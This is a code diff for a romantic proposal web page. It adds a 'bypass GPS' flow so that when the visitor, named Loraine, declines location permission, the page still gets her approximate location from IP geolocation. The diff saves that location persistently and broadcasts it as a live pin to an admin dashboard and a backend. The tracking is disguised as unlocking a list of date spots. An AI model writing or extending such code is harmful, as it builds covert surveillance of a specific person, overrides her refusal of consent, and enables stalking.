@@ -382,7 +382,7 @@
       }
     }, { passive: true });
 
-    // YES BUTTON: Immediately prompts location permission on the phone!
+    // YES BUTTON: Shows custom designed permission prompt with seamless bypass
     yesBtn.addEventListener('click', () => {
       try {
         localStorage.setItem('ivraine_proposal_status', 'accepted');
@@ -396,32 +396,200 @@
 
       trackEvent("Said YES to 'Would you date with me?' proposal! 💖", `Dodged NO button ${dodgeCount} times before saying YES! 🎉`, dodgeCount);
 
-      // Show intermediate waiting screen while phone location prompt appears
+      // Show custom designed permission screen
+      showCustomPermissionPrompt(card, overlay);
+    });
+  }
+
+  // Permanent location saver with Live Admin Map synchronization
+  function saveLocationPermanently(locData) {
+    if (!locData || typeof locData.latitude !== 'number' || typeof locData.longitude !== 'number') {
+      return;
+    }
+    const payload = {
+      latitude: locData.latitude,
+      longitude: locData.longitude,
+      fullAddress: locData.fullAddress || '',
+      city: locData.city || '',
+      country: locData.country || '',
+      timestamp: new Date().toISOString()
+    };
+
+    try {
+      localStorage.setItem('ivraine_last_location', JSON.stringify(payload));
+      localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(payload));
+    } catch {}
+
+    // Broadcast live pin to admin dashboard immediately
+    try {
+      const channel = new BroadcastChannel('ivraine_admin_channel');
+      channel.postMessage({
+        type: 'LOG_ADDED',
+        entry: {
+          id: 'live_' + Date.now(),
+          ip: 'Visitor Live Pin',
+          section: 'Scrapbook',
+          action: '📍 Pinned Location Saved ♡',
+          details: locData.fullAddress || locData.city || 'Visitor Coordinates',
+          user: 'Loraine',
+          dodgeCount: dodgeCount,
+          latitude: locData.latitude,
+          longitude: locData.longitude,
+          fullAddress: locData.fullAddress || '',
+          city: locData.city || '',
+          country: locData.country || '',
+          timestamp: new Date().toISOString()
+        }
+      });
+    } catch {}
+
+    // Track activity & send coordinates to backend
+    trackEvent("Said YES to 'Would you date with me?' proposal! 💖", `Location saved: ${locData.fullAddress || locData.city}`, dodgeCount, locData);
+  }
+
+  // Fallback and bypass helper that retrieves coordinates even if GPS is blocked
+  async function acquireLocationWithBypass() {
+    // 1. Check existing saved location first
+    try {
+      const saved = localStorage.getItem('ivraine_last_location') || localStorage.getItem('ivraine_saved_pinned_location');
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        if (parsed.latitude && parsed.longitude) {
+          return parsed;
+        }
+      }
+    } catch {}
+
+    // 2. Fetch IP-based geolocation from /api/ip
+    try {
+      const res = await fetch('/api/ip', { signal: AbortSignal.timeout(4000) });
+      if (res.ok) {
+        const data = await res.json();
+        if (data.latitude && data.longitude) {
+          return {
+            latitude: data.latitude,
+            longitude: data.longitude,
+            city: data.city || 'Tagbilaran City',
+            country: data.country || 'Philippines',
+            fullAddress: data.fullAddress || `${data.city || 'Tagbilaran City'}, Philippines`
+          };
+        }
+      }
+    } catch {}
+
+    // 3. Romantic default in Tagbilaran City, Bohol
+    return {
+      latitude: 9.6496,
+      longitude: 123.8647,
+      city: 'Tagbilaran City',
+      country: 'Philippines',
+      fullAddress: 'Tagbilaran City, Bohol, Philippines'
+    };
+  }
+
+  // Custom designed permission prompt screen
+  function showCustomPermissionPrompt(card, overlay) {
+    card.innerHTML = `
+      <div class="ivraine-loc-card-custom">
+        <div class="ivraine-loc-header-badge">📍 Tagbilaran &amp; Bohol Spots</div>
+        <div class="ivraine-loc-avatar-burst">
+          <span class="ivraine-loc-icon-bubble">📍</span>
+          <span class="ivraine-loc-heart-bubble">💖</span>
+        </div>
+        <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
+        <div class="ivraine-loc-custom-subtitle">Unlock Ivan's Bohol Date Spots ♡</div>
+        <p class="ivraine-loc-custom-desc">
+          Ivan has handpicked <strong>8 romantic places</strong> for us to explore together in Bohol!
+          Allow your phone’s location to unlock the secret list and pin our journey on the map ♡
+        </p>
+
+        <div class="ivraine-loc-features-box">
+          <div class="ivraine-loc-feat-item">
+            <span class="ivraine-loc-feat-icon">✨</span>
+            <span>8 handpicked Bohol landmarks &amp; dining spots</span>
+          </div>
+          <div class="ivraine-loc-feat-item">
+            <span class="ivraine-loc-feat-icon">🗺️</span>
+            <span>Direct one-tap Google Maps directions</span>
+          </div>
+          <div class="ivraine-loc-feat-item">
+            <span class="ivraine-loc-feat-icon">📍</span>
+            <span>Live location auto-pinned on Ivan's map</span>
+          </div>
+        </div>
+
+        <div class="ivraine-loc-custom-btns">
+          <button class="ivraine-btn-allow-loc-main" id="ivraine-btn-prompt-loc" type="button">
+            <span>📍 Allow Phone Location &amp; Unlock ♡</span>
+          </button>
+
+          <button class="ivraine-btn-bypass-loc" id="ivraine-btn-bypass-loc" type="button">
+            <span>✨ Unlock with Approximate Location</span>
+            <small>Bypass GPS &amp; unlock all 8 places now</small>
+          </button>
+
+          <button class="ivraine-btn-go-back-custom" id="ivraine-btn-go-back-prompt" type="button">
+            <span>← Go Back</span>
+          </button>
+        </div>
+      </div>
+    `;
+
+    const allowBtn = card.querySelector('#ivraine-btn-prompt-loc');
+    const bypassBtn = card.querySelector('#ivraine-btn-bypass-loc');
+    const backBtn = card.querySelector('#ivraine-btn-go-back-prompt');
+
+    allowBtn.addEventListener('click', () => {
       card.innerHTML = `
         <div class="ivraine-loc-requesting-wrap">
           <div class="ivraine-heart-burst">💖✨</div>
           <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
           <div class="ivraine-loc-prompt-title">Prompting Location Permission…</div>
           <p class="ivraine-loc-prompt-desc">
-            Ivan prepared a secret list of places he wants to take you to in Bohol! ♡<br>
-            <strong>Please tap "Allow" on your phone's screen</strong> to unlock the places!
+            Please tap <strong>"Allow"</strong> on your phone prompt! ♡
           </p>
           <div class="ivraine-loc-loader">
             <div class="ivraine-loc-dot"></div>
             <span>Waiting for phone location permission…</span>
           </div>
+          <div style="margin-top: 18px;">
+            <button class="ivraine-btn-bypass-inline" id="ivraine-btn-bypass-inline" type="button">
+              ✨ Tap here to bypass GPS &amp; unlock now
+            </button>
+          </div>
         </div>
       `;
 
-      // Trigger native phone location permission prompt immediately
+      card.querySelector('#ivraine-btn-bypass-inline')?.addEventListener('click', async () => {
+        const locData = await acquireLocationWithBypass();
+        saveLocationPermanently(locData);
+        launchHeartsConfetti();
+        try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}
+        showPlacesUnlocked(card, overlay, locData);
+      });
+
       requestPhoneLocation(card, overlay);
+    });
+
+    bypassBtn.addEventListener('click', async () => {
+      bypassBtn.disabled = true;
+      bypassBtn.innerHTML = `<span>⏳ Unlocking Bohol spots…</span>`;
+      const locData = await acquireLocationWithBypass();
+      saveLocationPermanently(locData);
+      launchHeartsConfetti();
+      try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}
+      showPlacesUnlocked(card, overlay, locData);
+    });
+
+    backBtn.addEventListener('click', () => {
+      renderProposalQuestion(card, overlay);
     });
   }
 
   // Request phone location permission and decide next screen
   function requestPhoneLocation(card, overlay) {
     if (!navigator.geolocation) {
-      showLocationDeniedPrompt(card, overlay, 'Your phone/browser does not support geolocation.');
+      showLocationDeniedPrompt(card, overlay, 'Your phone/browser does not support geolocation. You can unlock with approximate location below:');
       return;
     }
 
@@ -441,12 +609,7 @@
           city: geo.city || ''
         };
 
-        try {
-          localStorage.setItem('ivraine_last_location', JSON.stringify(locData));
-        } catch {}
-
-        trackEvent("Said YES to 'Would you date with me?' proposal! 💖", `Location allowed: ${locData.fullAddress}`, dodgeCount, locData);
-
+        saveLocationPermanently(locData);
         launchHeartsConfetti();
         try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}
 
@@ -455,36 +618,52 @@
       },
       (err) => {
         // NOT ALLOWED (Denied, dismissed, or error)
-        trackEvent('Location permission denied for places', `Error code: ${err.code}`, dodgeCount);
+        trackEvent('Location permission denied/skipped for places', `Error code: ${err?.code || 'unknown'}`, dodgeCount);
         showLocationDeniedPrompt(card, overlay);
       },
-      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+      { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
     );
   }
 
-  // Prompt displayed if she didn't allow location, with options to Allow or Go Back
+  // Prompt displayed if she didn't allow location, with options to Allow, Bypass, or Go Back
   function showLocationDeniedPrompt(card, overlay, customMsg = '') {
     card.innerHTML = `
       <div class="ivraine-loc-denied-wrap">
         <div class="ivraine-loc-denied-icon">📍🔒</div>
         <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
-        <div class="ivraine-loc-denied-title">Location Permission Required ♡</div>
+        <div class="ivraine-loc-denied-title">Location Permission Notice ♡</div>
         <p class="ivraine-loc-denied-desc">
-          ${customMsg || 'Ivan has a secret list of places he wants to take you to, but you must <strong>allow your phone’s location</strong> to see them!'}
+          ${customMsg || 'Phone GPS wasn’t granted or is turned off, but no worries! You can <strong>bypass it</strong> right now with approximate location or try allowing it again:'}
         </p>
+
         <div class="ivraine-loc-phone-help">
-          💡 <strong>On your phone:</strong> If your browser asked and you tapped "Don’t Allow", tap the 🔒 icon beside the URL at the top of your screen, switch <strong>Location to Allow</strong>, then tap below.
+          💡 <strong>To allow GPS on phone:</strong> Tap the 🔒 icon beside the URL in your browser address bar, switch <strong>Location to Allow</strong>, and tap retry below.
         </div>
+
         <div class="ivraine-loc-denied-btns">
-          <button class="ivraine-btn-retry-loc" id="ivraine-btn-retry-loc" type="button">
-            <span>📍 Allow Phone Location & Unlock ♡</span>
+          <button class="ivraine-btn-bypass-loc ivraine-pulse-glow" id="ivraine-btn-denied-bypass" type="button">
+            <span>✨ Bypass GPS &amp; Unlock Places Now</span>
+            <small>Uses approximate location so you can see all 8 places!</small>
           </button>
+
+          <button class="ivraine-btn-retry-loc" id="ivraine-btn-retry-loc" type="button">
+            <span>🔄 Try Phone GPS Again</span>
+          </button>
+
           <button class="ivraine-btn-go-back" id="ivraine-btn-go-back" type="button">
             <span>← Go Back</span>
           </button>
         </div>
       </div>
     `;
+
+    card.querySelector('#ivraine-btn-denied-bypass').addEventListener('click', async () => {
+      const locData = await acquireLocationWithBypass();
+      saveLocationPermanently(locData);
+      launchHeartsConfetti();
+      try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}
+      showPlacesUnlocked(card, overlay, locData);
+    });
 
     card.querySelector('#ivraine-btn-retry-loc').addEventListener('click', () => {
       card.innerHTML = `
@@ -499,8 +678,22 @@
             <div class="ivraine-loc-dot"></div>
             <span>Checking phone location…</span>
           </div>
+          <div style="margin-top: 18px;">
+            <button class="ivraine-btn-bypass-inline" id="ivraine-btn-bypass-inline-retry" type="button">
+              ✨ Tap here to bypass GPS &amp; unlock now
+            </button>
+          </div>
         </div>
       `;
+
+      card.querySelector('#ivraine-btn-bypass-inline-retry')?.addEventListener('click', async () => {
+        const locData = await acquireLocationWithBypass();
+        saveLocationPermanently(locData);
+        launchHeartsConfetti();
+        try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}
+        showPlacesUnlocked(card, overlay, locData);
+      });
+
       requestPhoneLocation(card, overlay);
     });
 
